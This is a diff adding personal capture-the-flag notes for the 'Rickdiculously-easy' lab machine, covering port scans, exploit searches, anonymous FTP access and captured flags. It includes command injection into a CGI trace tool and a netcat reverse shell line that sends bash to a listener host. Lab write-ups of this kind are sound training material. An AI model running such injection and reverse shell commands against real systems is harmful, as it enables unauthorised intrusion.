@@ -1,0 +1,146 @@
+machine - Rickdiculously-easy
+
+10.74.145.213
+
+=== === === ===
+checked for - robots.txt - found - {sc1}
+
+/cgi-bin/root_shell.cgi      -  found nothing
+/cgi-bin/tracertool.cgi      - found ip trace tool > it contains command injections >   {sc2}
+/cgi-bin/*                   - found nothing
+
+sitemap.xml - found nothing
+
+=== === === === ===
+commands:
+
+1>  nmap -Pn -p- -sV -sC -O --stats-every=10s 10.74.145.213
+
+2> searchsploit vsftpd 3.0.3
+
+3> searchsploit httpd 2.4.27
+
+4> searchsploit OpenSSH 7.5
+
+5> ftp 10.74.145.213         -- logedin by Anonymous / Anonymous
+
+6> inside ftp - ? > ls > less FLAG.txt > cd pub > ls -lha > found nothing
+
+7> dirb http://10.74.145.213
+
+
+=== === === === === === === === === nmap result:
+
+21/tcp    open  ftp     vsftpd 3.0.3
+ftp-anon: Anonymous FTP login allowed (FTP code 230)
+
+searchsploit vsftpd 3.0.3
+output:  vsftpd 3.0.3 - Remote Denial of Service               | multiple/remote/49719.py
+
+=== === === === === === === === === ===
+
+13337/tcp open  unknown
+| fingerprint-strings:
+|   NULL:
+|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
+
+=== === === === === === === === === ===
+
+22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
+| ssh-hostkey:
+|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
+|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
+|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
+
+------------------------------------------------------------------------
+
+OpenSSH 2.3 < 7.7 - Username Enumeration            | linux/remote/45233.py
+OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)      | linux/remote/45210.py
+OpenSSH < 7.7 - User Enumeration (2)                | linux/remote/45939.py
+
+=== === === === === === === === === ===
+
+ftp 10.74.145.213         -- logedin by Anonymous / Anonymous
+
+inside ftp::
+
+-rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
+drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
+
+found by commands:
+
+less FLAG.txt --> FLAG{Whoa this is unexpected}
+
+cd pub > ls -lha > found nothing
+
+=== === === === === === === === === ===
+9090/tcp  open  http    Cockpit web service 161 or earlier
+|_http-title: Did not follow redirect to https://10.74.145.213:9090/
+
+got flag there: FLAG {There is no Zeus, in your face!} - 10 Points
+=== === === === === === === === === ===
+
+/cgi-bin/tracertool.cgi      - found ip trace tool > it contains command injections >
+
+commands injected :
+
+    ;ls
+    to get the reverse shell checked out netcat is available
+    ;which nc    -    /usr/bin/nc
+
+then
+     start listener on port 4444
+     run command on site : ;nc -e /bin/bash 10.74.145.45 4444
+
+     got cmd
+
+in /etc/passwd :  found 3 users
+
+                 RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
+                 Morty:x:1001:1001::/home/Morty:/bin/bash
+                 Summer:x:1002:1002::/home/Summer:/bin/bash
+
+=== === === === === === === === === ===
+
+command : dirb http://10.74.145.213
+
+found - ==> DIRECTORY: http://10.74.145.213/passwords/
+           inside this found :
+                              Index of /passwords
+                                 [ICO]	Name	Last modified	Size	Description
+                                 [PARENTDIR]	Parent Directory	 	-
+                                 [TXT]	FLAG.txt	2017-08-22 02:31	44
+                                 [TXT]	passwords.html	2017-08-23 19:51	352
+
+
+inside flag.txt found flag - FLAG{Yeah d- just don't do it.} - 10 Points
+
+inside passwords.html > found password inside source page found password : <!--Password: winter-->
+
+{sc3}
+=== === === === === === === === === ===
+
+got shell !!!
+
+{sc4}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
